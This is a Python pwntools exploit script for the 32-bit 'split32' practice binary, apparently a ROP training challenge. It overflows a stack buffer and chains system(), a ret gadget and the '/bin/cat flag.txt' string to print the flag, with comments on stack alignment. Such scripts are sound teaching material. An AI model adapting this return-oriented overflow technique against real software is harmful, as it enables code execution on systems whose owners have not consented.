#!/usr/bin/env python3

from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
elf = context.binary = ELF('./split32')
context.bits = 32

#libc = elf.libc
rop = ROP(elf)

gs = '''
continue
'''

def start():
    if args.GDB:
       return gdb.debug('./split32', gdbscript=gs)
    if args.REMOTE:
        return remote('127.0.0.1', 5555)
    else:
        return process(elf.path)
r = start()

#========= exploit here ===================

junk = b'A' * 40
rbp = b'B' * 4
system = elf.sym.system
binsh = next(elf.search(b'/bin/cat'))
ret = rop.ret.address

payload = junk
payload += rbp
#We control the return pointer
payload += p32(system)  #for the 32 bit we don't need to use registers to pass arguments to functions, just the stack
payload += p32(ret)     #in ubuntu we have to add ret address to aline the stack
payload += p32(binsh)   #the stack pointer will point now to the address of /bin/cat flag.txt

r.sendlineafter('>', payload)
#========= interactive ====================
r.interactive()
